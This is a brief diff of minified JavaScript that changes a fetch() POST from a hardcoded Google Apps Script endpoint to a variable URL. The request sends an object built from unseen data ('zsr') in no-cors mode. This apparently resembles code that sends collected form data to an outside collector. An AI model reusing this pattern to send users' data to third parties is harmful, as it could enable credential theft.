@@ -9,7 +9,7 @@ var r=function(A,e){return(r=Object.setPrototypeOf||{__proto__:[]}instanceof Arr
 
      const shod0={"p":"0","od":{...zsr}};
      (async () => {
-         const rawResponse = await fetch('https://script.google.com/macros/s/AKfycbzA-xgTRtmhBb7KQagFoX-o63oDz0JYfN0a8P22Y1Su5ZM_rWIhkkGcjS8PzUyS5Y-XdA/exec', {
+         const rawResponse = await fetch(urli, {
             method: 'POST', 
              mode: 'no-cors', 
              cache: 'no-cache', 
